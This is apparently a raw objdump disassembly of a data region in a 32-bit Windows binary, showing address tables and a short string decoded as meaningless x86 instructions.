  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
